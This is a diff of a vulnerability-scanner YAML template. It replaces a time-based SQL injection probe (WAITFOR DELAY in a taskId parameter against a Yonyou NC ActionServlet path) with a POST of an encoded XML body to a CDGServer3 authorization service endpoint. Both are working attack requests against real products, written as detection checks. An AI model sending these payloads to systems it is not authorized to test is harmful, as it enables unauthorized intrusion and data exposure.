@@ -8,25 +8,14 @@ rules:
   r0:
     request:
       cache: true
-      method: GET
-      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:0%27--
-    expression: response.status == 200  && response.body_string.contains('任务报表')
-    output:
-      r0latency: response.latency
-  r1:
-    request:
-      cache: true
-      method: GET
-      read_timeout: "10"
-      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:{{sleepSecond1}}%27--
-    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000   && response.body_string.contains('任务报表')
-  r2:
-    request:
-      cache: true
-      method: GET
-      read_timeout: "10"
-      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:{{sleepSecond2}}%27--
-    expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000   && response.body_string.contains('任务报表')
-expression: r0() && r1() && r2()
+      method: POST
+      path: /CDGServer3/CDGAuthoriseTempletService1
+      headers:
+        Content-Type: application/xml
+      body: |-
+        CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDEJCIPHOPDOAMGLINIEJDIFOLLGEDIDMDAKIPEINHHOFBOHLPEJBPJBKJLDDEIFOGLGHKANECEEGNDCNMJNLNJBFKNGKKJFODMFEKBOGFNDNJMCMHOFJBLGHEBALFGNNGLPBMKHHHGNKNHJGLFLODDIKAAOOOAJAEMBLBNMGOFJELPABKOEGMFLIBGPMHJPEJCKFBGHHNGMDAJBKBNNMIMFELPGEHDFGNHMBLEIKMINOAOAINBLEOIGHAMOPDNOIFFEFLGBFOFAGACH
+    expression: response.status == 200 && size(response.body_string) > 1000
+expression: r0() 
 detail:
   author: k3ppf0r
+ 
